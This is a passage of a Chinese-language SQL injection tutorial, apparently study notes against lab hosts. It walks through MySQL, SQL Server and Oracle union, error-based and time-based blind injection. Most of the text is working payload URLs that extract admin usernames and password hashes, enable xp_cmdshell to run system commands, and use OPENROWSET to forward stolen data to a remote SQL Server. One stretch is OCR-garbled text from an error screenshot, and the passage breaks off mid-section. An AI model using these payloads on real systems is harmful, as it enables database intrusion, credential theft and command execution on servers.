+<p><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">http://target_sys.com/mysqlinj.php?id=-1</a> and updatexml(1,concat(0x7e,(SELECT distinct<br>SUBSTRING(concat(0x23,username,0x3a,password,0x23),33,40) FROM admin limit<br>0,1),0x7e),1)<br>admin:e10adc3949ba59abbe56e057f20f883e     最后将字符盘拼接起来就是完整的数据<img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614571451374-527e971f-1bb3-4567-89eb-bd106a52cda4.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=616&size=15482&status=done&style=none&width=616" alt="image.png"></p>
+<h2 id="四、mysql-php延时注入"><a href="#四、mysql-php延时注入" class="headerlink" title="四、mysql+php延时注入"></a>四、mysql+php延时注入</h2><h2 id="1、什么是延时注入？"><a href="#1、什么是延时注入？" class="headerlink" title="1、什么是延时注入？"></a>1、什么是延时注入？</h2><ul>
+<li><p>延时注入属于盲注入的一种，这种注入 通过mysql里面的sleep（）函数，这个函数的意思是延时执行多少秒</p>
+</li>
+<li><p>而sleep通常与if一起使用 例如 select if(‘root’=’root’,sleep(3),0)</p>
+</li>
+<li><p>延时方法是先获取数据的长度</p>
+<h2 id="2、怎么获取库名？"><a href="#2、怎么获取库名？" class="headerlink" title="2、怎么获取库名？"></a>2、怎么获取库名？</h2></li>
+<li><p>获取库名也是同样的语句只是把查询的内容改变一个查询库 select database()-&gt;target_sys</p>
+<h2 id="3、怎么获取表？"><a href="#3、怎么获取表？" class="headerlink" title="3、怎么获取表？"></a>3、怎么获取表？</h2></li>
+<li><p>查询所有表的长度 长度为30</p>
+</li>
+<li><p>select if(LENGTH((select(group_concat(TABLE_NAME)) from information_schema.TABLES </p>
+</li>
+</ul>
+<p>where TABLE_SCHEMA=database()))=30,sleep(5),0)<img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614579339855-7553f7e5-dbc6-410c-bc6b-bff0589e607b.png#align=left&display=inline&height=900&margin=%5Bobject%20Object%5D&name=image.png&originHeight=900&originWidth=1600&size=98525&status=done&style=none&width=1600" alt="image.png"><br>‘</p>
+<ul>
+<li>查询所有表 第一个字符为97ascii为a查询到40</li>
+<li>select if(ascii(SUBSTRING((select group_concat(TABLE_NAME)from </li>
+</ul>
+<p>information_schema.TABLES where TABLE_SCHEMA=database()),1,1))=97,sleep(5),0)<img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614579492463-74c8becc-7d2a-4ef0-a84a-508ae9033d4a.png#align=left&display=inline&height=900&margin=%5Bobject%20Object%5D&name=image.png&originHeight=900&originWidth=1600&size=99079&status=done&style=none&width=1600" alt="image.png"></p>
+<h2 id="4、怎么查询字段？"><a href="#4、怎么查询字段？" class="headerlink" title="4、怎么查询字段？"></a>4、怎么查询字段？</h2><ul>
+<li><p>查询admin表的字段把admin转换成十六进制0x61646d696e带入语句</p>
+</li>
+<li><p>首先确认长度</p>
+</li>
+<li><p>select if(LENGTH((select group_concat(COLUMN_NAME) from information_schema.COLUMNS </p>
+<pre><code>where TABLE_NAME=0x61646d696e))=20,sleep(5),0）
+</code></pre>
+</li>
+<li><p>查询数据</p>
+</li>
+</ul>
+<p>select if(ascii(SUBSTRING((select group_concat(COLUMN_NAME) from<br>information_schema.COLUMNS where TABLE_NAME=0x61646d696e),1,1))=105,sleep(5),0)<img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614579815621-3be395df-c775-4f26-8390-286f056f44ed.png#align=left&display=inline&height=900&margin=%5Bobject%20Object%5D&name=image.png&originHeight=900&originWidth=1600&size=96171&status=done&style=none&width=1600" alt="image.png"></p>
+<h2 id="五、sqlserver联合注入"><a href="#五、sqlserver联合注入" class="headerlink" title="五、sqlserver联合注入"></a>五、sqlserver联合注入</h2><h2 id="1、什么是sqlserver？"><a href="#1、什么是sqlserver？" class="headerlink" title="1、什么是sqlserver？"></a>1、什么是sqlserver？</h2><ul>
+<li><p>sqlserver经常与asp或者aspx一起使用，操作系统多数是win2012、win2018</p>
+</li>
+<li><p>数据库版本 SQL2008、SQL    2012</p>
+<h2 id="2、注释符号有哪些？"><a href="#2、注释符号有哪些？" class="headerlink" title="2、注释符号有哪些？"></a>2、注释符号有哪些？</h2></li>
+<li><p>–空格 当行注释</p>
+</li>
+<li><p>/* */ 多行注释</p>
+<h2 id="3、判断是否注入！"><a href="#3、判断是否注入！" class="headerlink" title="3、判断是否注入！"></a>3、判断是否注入！</h2></li>
+<li><p>‘单引号是否报错</p>
+</li>
+<li><p>and 1=2</p>
+</li>
+<li><p>and 1=1</p>
+<h2 id="4、判断列数"><a href="#4、判断列数" class="headerlink" title="4、判断列数"></a>4、判断列数</h2></li>
+<li><p>order by</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://169.254.82.111:84/index.aspx?id=1</a> order by 3     换成4则会报错</p>
+</li>
+<li><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614584705141-d6a37946-1ec2-4644-816a-b85ab37b327b.png#align=left&display=inline&height=215&margin=%5Bobject%20Object%5D&name=image.png&originHeight=215&originWidth=693&size=19945&status=done&style=none&width=693" alt="image.png"></p>
+<h2 id="5、联合查询"><a href="#5、联合查询" class="headerlink" title="5、联合查询"></a>5、联合查询</h2></li>
+<li><p>联合查询 需要每个列的类型要一直或者可以使用null直到页面出错</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=-1">http:/169.254.82.111:84/index.aspx?id=-1</a> union select null,null,null</p>
+</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614585013363-db82e224-0c97-4cb5-8ce3-12e34cd3f8c8.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=749&size=21759&status=done&style=none&width=749" alt="image.png"></p>
+<h2 id="6、怎么查询系统信息"><a href="#6、怎么查询系统信息" class="headerlink" title="6、怎么查询系统信息"></a>6、怎么查询系统信息</h2><ul>
+<li><p>db_name() 数据库名</p>
+</li>
+<li><p>@@version 版本信息</p>
+</li>
+<li><p>User_Name() 当前用户</p>
+</li>
+<li><p>host_name() 计算机名称</p>
+</li>
+<li><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614585383002-ca8a396b-e6b8-45f8-98b0-bb0a93f62f6c.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=37529&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="7、怎么查询数据"><a href="#7、怎么查询数据" class="headerlink" title="7、怎么查询数据"></a>7、怎么查询数据</h2></li>
+<li><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=-1">http://169.254.82.111:84/index.aspx?id=-1</a> union select null,username,password from admin</p>
+</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614585480047-d1cd29c2-acf1-46b5-a08c-7c3197148f1e.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=35242&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="六、sqlserver报错注入"><a href="#六、sqlserver报错注入" class="headerlink" title="六、sqlserver报错注入"></a>六、sqlserver报错注入</h2><h2 id="1、什么是sqlserver报错注入"><a href="#1、什么是sqlserver报错注入" class="headerlink" title="1、什么是sqlserver报错注入"></a>1、什么是sqlserver报错注入</h2><ul>
+<li><p>SqlServer在语句执行错误的时候会报错，并且会在网页显示出来。</p>
+</li>
+<li><p>环境 sql2008+aspx</p>
+<h2 id="2、怎样显示系统信息？"><a href="#2、怎样显示系统信息？" class="headerlink" title="2、怎样显示系统信息？"></a>2、怎样显示系统信息？</h2></li>
+<li><p>and@@version&gt;0利用mysql在转换类型的时候就出错时，会显示系统信息。</p>
+</li>
+<li><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614586831678-e5ee17a8-d360-403e-ae7b-10a82e163c55.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=74230&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="3、怎么爆出数据库"><a href="#3、怎么爆出数据库" class="headerlink" title="3、怎么爆出数据库"></a>3、怎么爆出数据库</h2></li>
+<li><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=-1">http://169.254.82.111:84/</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=-1">index.aspx?id=-1</a> and db_name()&gt;0</p>
+</li>
+<li><pre><code>    ![image.png](https://cdn.nlark.com/yuque/0/2021/png/2380179/1614586913311-38575c78-40cc-4f12-8042-9af95ce37d8b.png)                           
+</code></pre>
+</li>
+</ul>
+<p>169.254.82.111:81/articlephp?X<br>在将nvarchar值’mydb’转换成x<br>6之C合<br>文<br>不安全<a target="_blank" rel="noopener" href="http://169.254.82.111:84/idexaspxid-1%%">http://169.254.82.111:84/idexaspxid-1%%</a><br>网站开发<br>应用<br>英文翻译学习<br>百度<br>FG<br>编程学习<br>tools<br>“”应用程序中的服务器错误.<br>在将nvarchar<br>har值mydb’转换成数据类型int时失败.<br>说明;,行当前W请明间,出现处理的异,请俭管性线信息,以了解有失诚霜以及代酒中导误批的细息.<br>异常详细信息:SyemDaasqclnon在将narch败<br>源错误:<br>只有在调试最式下选行铜时,生成此处理的源代码才会显示出若要用比功请执行以下少骗之一,后求咖<br>1.在产生错误的文件的顶部添加一条”Debug-true”指令.例如:<br>KameaROM</p>
+<h2 id="4、如何爆出数据"><a href="#4、如何爆出数据" class="headerlink" title="4、如何爆出数据"></a>4、如何爆出数据</h2><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://169.254.82.111:84/index.aspx?id=1</a> and (select top 1 password from admin)&gt;0<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http:/</a>/1<a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">69.254.82.111:84</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">/index.aspx?id=1</a> and (select top 1 username from admin)&gt;0<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614587433290-d63607c7-dedc-42df-8b9d-d20c8f6e2f4a.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=62531&status=done&style=none&width=890" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614587501694-7ecbf77c-9573-4fe9-bccb-9f28d7c438d3.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=58009&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="七、sqlserver快速爆表、爆列、爆数据"><a href="#七、sqlserver快速爆表、爆列、爆数据" class="headerlink" title="七、sqlserver快速爆表、爆列、爆数据"></a>七、sqlserver快速爆表、爆列、爆数据</h2><h2 id="1、如何查询当前用户？"><a href="#1、如何查询当前用户？" class="headerlink" title="1、如何查询当前用户？"></a>1、如何查询当前用户？</h2><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://169.254.82.111:84/index.aspx?id=1</a> and user_name()&gt;1<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614589229789-cf297dcc-aa9f-4ece-80b6-fbe6bfe84917.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=55074&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="2、在根据当前用户爆出所有表"><a href="#2、在根据当前用户爆出所有表" class="headerlink" title="2、在根据当前用户爆出所有表"></a>2、在根据当前用户爆出所有表</h2><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://169.254.82.111:84/index.aspx?id=1</a> and(select TABLE_NAME from<br>information_schema.TABLES where TABLE_SCHEMA=’dbo’ FOR XML PATH)&gt;1<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614589354419-47d617be-066d-4d87-b3ac-3bb483f0a3c5.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=71934&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="3、怎么爆出所有的列？"><a href="#3、怎么爆出所有的列？" class="headerlink" title="3、怎么爆出所有的列？"></a>3、怎么爆出所有的列？</h2><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111:84</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">/index.aspx?id=1</a> and(select COLUMN_NAME from<br>information_schema.COLUMNS where TABLE_NAME=’admin’ FOR XML PATH)&gt;1<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614589439567-18e4b72f-454b-4ba6-9c29-1973f78054c6.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=80495&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="4、怎么爆出数据"><a href="#4、怎么爆出数据" class="headerlink" title="4、怎么爆出数据?"></a>4、怎么爆出数据?</h2><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://169.254.82.111:84/index.aspx?id=1</a> and ( select username,password from<br>admin FOR XML PATH)&gt;1<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614589521141-46625975-54e8-4bcf-8ad0-3ed90047ee39.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=63873&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="八、sqlserver执行系统命令"><a href="#八、sqlserver执行系统命令" class="headerlink" title="八、sqlserver执行系统命令"></a>八、sqlserver执行系统命令</h2><h2 id="1、怎样实现两条SQL语句是用分号隔开"><a href="#1、怎样实现两条SQL语句是用分号隔开" class="headerlink" title="1、怎样实现两条SQL语句是用分号隔开"></a>1、怎样实现两条SQL语句是用分号隔开</h2><ul>
+<li><p>select * from art; select * from admin</p>
+<h2 id="2、如果用户拥有管理员sa权限则可以用哪个命令重新开启它？"><a href="#2、如果用户拥有管理员sa权限则可以用哪个命令重新开启它？" class="headerlink" title="2、如果用户拥有管理员sa权限则可以用哪个命令重新开启它？"></a>2、如果用户拥有管理员sa权限则可以用哪个命令重新开启它？</h2></li>
+<li><p>;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure </p>
+</li>
+</ul>
+<p>‘xp_cmdshell’, 1;RECONFIGURE;<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614662151556-eba82eda-8d79-4883-a751-b9af7004c1d7.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=37690&status=done&style=none&width=890" alt="image.png"></p>
+<ul>
+<li>命令解析</li>
+</ul>
+<p>EXEC sp_configure ‘show advanced options’,1//允许修改高级参数<br>RECONFIGUREEXEC sp_configure ‘xp_cmdshell’,1 //打开 xp_cmdshell 扩展<br>RECONFIGURE</p>
+<h2 id="3、执行系统命令"><a href="#3、执行系统命令" class="headerlink" title="3、执行系统命令"></a>3、执行系统命令</h2><ul>
+<li>EXEC master.dbo.xp_cmdshell ‘ipconfig’</li>
+</ul>
+<ul>
+<li>开始xp_cmdshell</li>
+<li><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> sp_configure ‘show advanced </li>
+</ul>
+<p>options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614662378445-b4108a3a-b6b1-4fda-badc-9040169da93a.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=37429&status=done&style=none&width=890" alt="image.png"></p>
+<ul>
+<li>执行系统命令 把命令结果输出到指定文件</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell<br>‘ipconfig &gt;&gt;C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/ip.txt&#39;">www.demo1.com\ip.txt&#39;</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614662544805-1247bed8-854e-41f6-93b4-1bf04daa4574.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=37361&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="九、sqlserver-openrowset-转发利用"><a href="#九、sqlserver-openrowset-转发利用" class="headerlink" title="九、sqlserver openrowset 转发利用"></a>九、sqlserver openrowset 转发利用</h2><h2 id="1、简介和原理"><a href="#1、简介和原理" class="headerlink" title="1、简介和原理"></a>1、简介和原理</h2><ul>
+<li><p>适用于盲注入，页面不返回信息，使用这种注入方法，需要一台带有SQLserver的机器。</p>
+</li>
+<li><p>原理就是把当前数据转发到远程的sqlserver上、</p>
+<h2 id="2、开始扩展"><a href="#2、开始扩展" class="headerlink" title="2、开始扩展"></a>2、开始扩展</h2><p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;exec">http://169.254.82.111:84/index.aspx?id=1;exec</a> sp_configure ‘show advanced options’,1<br>reconfigure;exec sp_configure ‘Ad Hoc Distributed Queries’,1 reconfigure<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614676719482-b16be06f-509e-4700-95bd-04c0c09b21a8.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=37788&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="3、怎样实现两边创建临时表"><a href="#3、怎样实现两边创建临时表" class="headerlink" title="3、怎样实现两边创建临时表"></a>3、怎样实现两边创建临时表</h2></li>
+<li><p>create table ##nonamed( dir ntext, num int )</p>
+</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614676881871-c55666f2-40e1-494f-a828-81226c32b0bb.png#align=left&display=inline&height=447&margin=%5Bobject%20Object%5D&name=image.png&originHeight=447&originWidth=654&size=31281&status=done&style=none&width=654" alt="image.png"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;create">http://</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111:84</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;create">/index.aspx?id=1;create</a> table %23%23nonamed( dir ntext, num int )</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614676969331-5a12262c-85ed-4861-96e4-a2bf5ba46339.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=55280&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="4、怎样查询路径？"><a href="#4、怎样查询路径？" class="headerlink" title="4、怎样查询路径？"></a>4、怎样查询路径？</h2><ul>
+<li>向 nonamed 表插入 c 盘下路径的数据</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;insert">http://</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111:84</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;insert">/index.aspx?id=1;insert</a> %23%23nonamed execute<br>master..xp_dirtree ‘c:/‘,1<br>这里就是把数据转发到远程 169.254.82.111 sqlserver 上<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;insert">http://</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111:84</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;insert">/index.aspx?id=1;insert</a> into OPENROWSET(‘SQLOLEDB’,<br>‘server=<a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111</a>;uid=sa;pwd=123456’, ‘select * from %23%23nonamed’ ) select *<br>from %23%23nonamed<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614677692740-64df4dde-8bd1-491e-8b6b-b2414d51b5e5.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=39716&status=done&style=none&width=890" alt="image.png"><br>在远程 sqlserver 执行这个命令 就可以获取 数据<br>select * from %23%23nonamed   如下图：<img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614677731483-36723634-dc11-4a45-9162-7ca49b4bd1d5.png#align=left&display=inline&height=545&margin=%5Bobject%20Object%5D&name=image.png&originHeight=545&originWidth=750&size=32439&status=done&style=none&width=750" alt="image.png"></p>
+<h2 id="十、sqlserver-延时注入"><a href="#十、sqlserver-延时注入" class="headerlink" title="十、sqlserver 延时注入"></a>十、sqlserver 延时注入</h2><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><ul>
+<li>WAITFOR 是 SQLServer 中 Transact-SQL 提供的一个流程控制语句。它的作用就是等待特定时</li>
+</ul>
+<p>间，然后继续执行后续的语句。它包含一个参数 DELAY，用来指定等待的时间。</p>
+<h2 id="2、怎样判断注入呢？"><a href="#2、怎样判断注入呢？" class="headerlink" title="2、怎样判断注入呢？"></a>2、怎样判断注入呢？</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111:84</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">/index.aspx?id=1</a> waitfor delay ‘0:0:5’</li>
+<li>页面延时 5 秒返回</li>
+<li>SUBSTRING 截取字符串</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614749180881-01668b37-c8b7-4ae5-8b82-da1920819408.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=34034&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="3、怎样查询信息？"><a href="#3、怎样查询信息？" class="headerlink" title="3、怎样查询信息？"></a>3、怎样查询信息？</h2><ul>
+<li>数据库版本（select@@version)</li>
+<li>数据库名（select db_name())</li>
+<li>获取密码(select password from admin）</li>
+</ul>
+<h2 id="4、截取字符判断法"><a href="#4、截取字符判断法" class="headerlink" title="4、截取字符判断法"></a>4、截取字符判断法</h2><ul>
+<li>SUBSTRING从第一位开始取一位</li>
+<li>select SUBSTRING(DB_NAME(),1,1)</li>
+<li><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111:84</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">/index.aspx?id=1</a> if(SUBSTRING(DB_NAME(),1,1)=CHAR(109)) waitfor </li>
+</ul>
+<p>delay ‘0:0:5’<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614750840336-1ff5b836-0d15-4a48-9fd4-41ee501b370c.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=34363&status=done&style=none&width=890" alt="image.png"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://169.254.82.111:84/index.aspx?id=1</a> if(SUBSTRING(DB_NAME(),1,1)=’m’) waitfor delay </li>
+</ul>
+<p>‘0:0:5’<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614750947985-976eeb24-ee1b-47a1-b3a8-ee72b596cec6.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=38065&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="5、ASCII码半截取法"><a href="#5、ASCII码半截取法" class="headerlink" title="5、ASCII码半截取法"></a>5、ASCII码半截取法</h2><ul>
+<li>ASCII把字符转换ASCII码</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://www.demo1.com/index.aspx?id=1</a> IF ASCII(SUBSTRING(DB_NAME(),1,1))=109<br>WAITFOR DELAY ‘0:0:5’ –<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614751335483-2b915be4-b369-421b-973a-60a1fd2cbf71.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=36445&status=done&style=none&width=890" alt="image.png"></p>
+<ul>
+<li>select * from art where id=1 IF ASCII(SUBSTRING(DB_NAME(),1,1))&gt;30 WAITFOR DELAY </li>
+</ul>
+<p>‘0:0:5’<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614751470757-145b9936-7a61-4a8c-b75f-a9e96ca1b34a.png#align=left&display=inline&height=453&margin=%5Bobject%20Object%5D&name=image.png&originHeight=453&originWidth=691&size=37941&status=done&style=none&width=691" alt="image.png"><br>select * from art where id=1 IF ASCII(SUBSTRING(DB_NAME(),1,1))&gt;30 WAITFOR DELAY<br>‘0:0:5’<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614751504980-0215ae61-c2c4-43c3-b675-4bcdae118023.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=35489&status=done&style=none&width=890" alt="image.png"></p>
+<p>1-126 遍历去对比要好一些 假如数据大的话就可以节省很多的时间。<br>0-126 共 127 个<br>大于 50 51-127 74 127-74 </p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="十一、oracle-jsp-联合查询注入"><a href="#十一、oracle-jsp-联合查询注入" class="headerlink" title="十一、oracle + jsp 联合查询注入"></a>十一、oracle + jsp 联合查询注入</h2><h2 id="1、注释符号"><a href="#1、注释符号" class="headerlink" title="1、注释符号"></a>1、注释符号</h2><ul>
+<li><p>–空格 当行注释</p>
+</li>
+<li><p>/* */ 多行注释</p>
+<h2 id="2、判断是否注入"><a href="#2、判断是否注入" class="headerlink" title="2、判断是否注入"></a>2、判断是否注入</h2></li>
+<li><p>and 1=1 –</p>
+</li>
+<li><p>and 1=2 –</p>
+</li>
+</ul>
+<h2 id="3、列数"><a href="#3、列数" class="headerlink" title="3、列数"></a>3、列数</h2><ul>
+<li>order by</li>
+<li><a target="_blank" rel="noopener" href="http://www.jsporcle.com/a.jsp?username=SMITH%27">http://www.jsporcle.com/a.jsp?username=SMITH</a> order by 8 – </li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1615264328441-e0673b78-3a29-46a2-9bb3-468e7a073009.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=31308&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="4、联合查询了解"><a href="#4、联合查询了解" class="headerlink" title="4、联合查询了解"></a>4、联合查询了解</h2><ul>
+<li><p>因为oracle对列的类型比较严谨，所以要用null可以匹配任意类型</p>
+</li>
+<li><p>Oracle 中的 dual 表是一个单行单列的虚拟表</p>
+</li>
+<li><p>Dual 是 Oracle 中的一个实际存在的表，任何用户均可读取。</p>
+</li>
+<li><p>所以可以通过这个 dual 表 来显示列数。</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.jsporcle.com/a.jsp?username=SMITH%2527">http://www.jsporcle.com/a.jsp?username=SMITH%27</a> union select </p>
+<pre><code>null,null,null,null,null,null,null,null from dual --
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1615264553790-29ef1159-799d-4a61-afef-8c65b76971e7.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=43925&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="5、怎样获取oracle信息"><a href="#5、怎样获取oracle信息" class="headerlink" title="5、怎样获取oracle信息"></a>5、怎样获取oracle信息</h2></li>
+<li><p>Oracle版本信息</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.jsporcle.com/a.jsp?username=SMITH">http://www.jsporcle.com/a.jsp?username=SMITH</a>’ union select null,null,(select banner from </p>
+<pre><code>sys.v_$version where rownum=1),null,null,null,null,null from dual –
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1615264772728-6b511f1b-5df4-4189-8701-b30f1d18c9b1.png#align=left&display=inline&height=135&margin=%5Bobject%20Object%5D&name=image.png&originHeight=135&originWidth=915&size=37482&status=done&style=none&width=915" alt="image.png"></p>
+</li>
+<li><p>（1） 当前用户权限 （select * from session_roles）</p>
+</li>
+<li><p>（2） 当前数据库版本 （ select banner from sys.v_$version where rownum=1）</p>
+</li>
+<li><p>（3） 服务器出口 IP (用 utl_http.request 可以实现)</p>
+</li>
+<li><p>（4） 服务器监听 IP (select utl_inaddr.get_host_address from dual)</p>
+</li>
+<li><p>（5） 服务器操作系统 （select member from v$logfile where rownum=1）</p>
+</li>
+<li><p>（6） 服务器 sid (select instance_name from v$instance)</p>
+</li>
+<li><p>（7） 当前连接用户 (select SYS_CONTEXT (‘USERENV’, ‘CURRENT_USER’) from dual)</p>
+</li>
+<li><p>（8） 当前用户 (SELECT user FROM dual)</p>
+</li>
+</ul>
+<h2 id="6、怎样查询数据？"><a href="#6、怎样查询数据？" class="headerlink" title="6、怎样查询数据？"></a>6、怎样查询数据？</h2><ul>
